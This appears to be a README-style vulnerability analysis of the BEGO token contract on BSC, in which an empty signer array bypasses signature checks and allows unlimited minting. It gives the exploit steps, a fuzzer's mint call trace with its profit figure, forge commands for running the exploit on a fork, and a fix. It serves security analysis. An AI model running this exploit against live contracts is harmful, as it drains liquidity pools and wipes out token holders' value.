# BEGO Token Vulnerability Analysis

## Overview

The BEGO token (0xc342774492b54ce5F8ac662113ED702Fc1b34972) on BSC has a critical vulnerability in its signature validation logic that allows anyone to mint unlimited tokens without authorization.

## Vulnerability Details

### Root Cause

The vulnerability exists in the `isSigners` function:

```solidity
function isSigners(address[] memory _signers) public view returns (bool){
    for (uint8 i = 0; i < _signers.length; i++) {
        if (!_containsSigner(_signers[i])) {
            return false;
        }
    }
    return true;  // Returns true for empty array!
}
```

When an empty array is passed, the loop doesn't execute and the function returns `true`, bypassing all signature validation.

### Exploit Flow

1. Call `mint()` with empty signature arrays (r=[], s=[], v=[])
2. The `isSigned` modifier calls `isSigners()` with an empty array
3. `isSigners([])` returns `true` (vulnerability)
4. Tokens are minted without any valid signatures

## Fuzzer Discovery

ItyFuzz discovered this vulnerability and found the optimal exploit:

```
[Sender] 0xe1A425f1AC34A8a441566f93c82dD730639c8510
   ├─[1] 0xc342774492b54ce5F8ac662113ED702Fc1b34972.mint(4951767240.7092 ether, 0x060968186804e803ff86, 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024, (), (), ())
   └─[1] 0xc342774492b54ce5F8ac662113ED702Fc1b34972.burn(0)
```

- Mint amount: 4,951,767,240 BEGO
- Profit: 12.036 ETH

## Running the Tests

### Basic Exploit Test
```bash
forge test --match-test testExploit -vvv
```

### Maximum Profit Analysis
```bash
forge test --match-test testFindMaxProfit -vvv
```

### Current Block Test
```bash
forge test --match-test testCurrentBlock -vvv
```

## Key Findings

1. **Unlimited Minting**: Anyone can mint any amount of BEGO tokens
2. **No Authorization Required**: Empty signature arrays bypass all checks
3. **Profit Limited by Liquidity**: Maximum profit depends on BEGO/WBNB pool liquidity
4. **Multiple Exploits Possible**: Each unique `txHash` allows a new mint

## Mitigation

The contract should validate that signature arrays are not empty:

```solidity
function isSigners(address[] memory _signers) public view returns (bool){
    require(_signers.length > 0, "Empty signers array");
    // ... rest of validation
}
```

## Impact

- **Severity**: Critical
- **Economic Impact**: Total drainage of liquidity pools
- **Token Holder Impact**: Complete devaluation of BEGO tokens

## Forge Commands

```bash
# Install dependencies
forge install

# Run all tests
forge test --match-path test/BEGO*.sol -vvv

# Run with specific RPC
forge test --match-test testExploit --fork-url https://bsc-dataseed.binance.org/ --fork-block-number 22315679 -vvv
```